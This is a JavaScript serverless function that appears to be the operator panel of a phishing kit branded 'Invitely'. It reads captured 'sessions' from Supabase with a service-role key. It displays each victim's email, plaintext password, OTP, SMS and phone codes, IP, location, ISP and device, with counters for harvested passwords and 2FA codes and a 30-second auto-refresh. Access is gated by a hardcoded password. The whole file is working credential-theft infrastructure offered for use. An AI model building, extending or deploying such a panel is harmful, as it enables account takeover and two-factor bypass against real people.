import { dbSelect } from './_supabase.js';

const PASSWORD = 'viewlogs123';

export const handler = async (event) => {
  if (event.queryStringParameters?.p !== PASSWORD) return { statusCode: 403, body: 'Forbidden' };

  try {
    // Supabase REST: order by created_at desc, limit 500
    const BASE = process.env.SUPABASE_URL + '/rest/v1';
    const KEY  = process.env.SUPABASE_SERVICE_ROLE_KEY;

    const r = await fetch(
      `${BASE}/sessions?select=*&order=created_at.desc&limit=500`,
      { headers: { 'apikey': KEY, 'Authorization': `Bearer ${KEY}` } }
    );
    const list = await r.json();

    const rows = list.map(s => `
      <tr>
        <td>${esc(s.created_at?.replace('T',' ').split('.')[0]||'')}</td>
        <td>${esc(s.email||'')}</td>
        <td>${esc(s.password||'')}</td>
        <td>${esc(s.otp||'')}</td>
        <td>${esc(s.sms_code||'')}</td>
        <td>${esc(s.phone_code||'')}</td>
        <td><span class="badge badge-${s.status||'pending'}">${esc(s.status||'pending')}</span></td>
        <td>${esc(s.response_type||'')}</td>
        <td>${esc(s.ip||'')}</td>
        <td>${esc([s.city,s.region,s.country].filter(Boolean).join(', '))}</td>
        <td>${esc(s.isp||'')}</td>
        <td style="max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc((s.device||'').substring(0,80))}</td>
      </tr>`).join('');

    const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
  <title>📊 Logs — Invitely</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:Monaco,'Courier New',monospace;background:#0d1117;color:#c9d1d9;padding:20px;font-size:12px}
    h1{color:#58a6ff;margin-bottom:20px;font-size:18px}
    .stats{display:flex;gap:16px;margin-bottom:20px;flex-wrap:wrap}
    .stat{background:#0d419f;border:1px solid #1f6feb;border-radius:8px;padding:14px 20px;text-align:center;min-width:120px}
    .stat-number{font-size:26px;font-weight:bold;color:#58a6ff}
    .stat-label{font-size:11px;color:#8b949e;margin-top:4px}
    .controls{margin-bottom:14px;display:flex;gap:8px;align-items:center}
    .btn{background:#238636;color:#fff;border:none;padding:7px 14px;border-radius:6px;cursor:pointer;font-size:11px}
    .btn:hover{background:#2ea043}
    .note{color:#8b949e;font-size:11px}
    .wrap{overflow-x:auto}
    table{width:100%;border-collapse:collapse;background:#010409;border:1px solid #30363d;border-radius:6px;overflow:hidden;white-space:nowrap}
    th{background:#0d419f;padding:8px 10px;text-align:left;border-bottom:1px solid #30363d}
    td{padding:7px 10px;border-bottom:1px solid #1e2636;vertical-align:top}
    tr:hover{background:#0d1117}
    .badge{padding:2px 7px;border-radius:3px;font-size:10px;font-weight:bold}
    .badge-pending{background:#21262d;color:#8b949e}
    .badge-responded{background:#238636;color:#fff}
    .empty{text-align:center;padding:40px;color:#8b949e}
  </style>
</head>
<body>
  <h1>📊 Invitely — Credential Logs</h1>
  <div class="stats">
    <div class="stat"><div class="stat-number">${list.length}</div><div class="stat-label">Total Sessions</div></div>
    <div class="stat"><div class="stat-number">${list.filter(s=>s.password).length}</div><div class="stat-label">Passwords</div></div>
    <div class="stat"><div class="stat-number">${list.filter(s=>s.otp||s.sms_code||s.phone_code).length}</div><div class="stat-label">2FA Codes</div></div>
    <div class="stat"><div class="stat-number">${list.filter(s=>s.status==='responded').length}</div><div class="stat-label">Responded</div></div>
  </div>
  <div class="controls">
    <button class="btn" onclick="location.reload()">🔄 Refresh</button>
    <span class="note">Auto-refreshes every 30s · ${new Date().toISOString().replace('T',' ').split('.')[0]} UTC</span>
  </div>
  <div class="wrap">
    <table>
      <thead><tr>
        <th>Time (UTC)</th><th>Email</th><th>Password</th><th>OTP</th>
        <th>SMS</th><th>Phone</th><th>Status</th><th>Response</th>
        <th>IP</th><th>Location</th><th>ISP</th><th>Device</th>
      </tr></thead>
      <tbody>${rows||'<tr><td colspan="12" class="empty">No sessions yet</td></tr>'}</tbody>
    </table>
  </div>
  <script>setTimeout(()=>location.reload(),30000)</script>
</body>
</html>`;

    return { statusCode: 200, headers: { 'Content-Type': 'text/html' }, body: html };
  } catch (e) {
    return { statusCode: 500, body: `<pre>Error: ${e.message}</pre>` };
  }
};

function esc(s) {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}
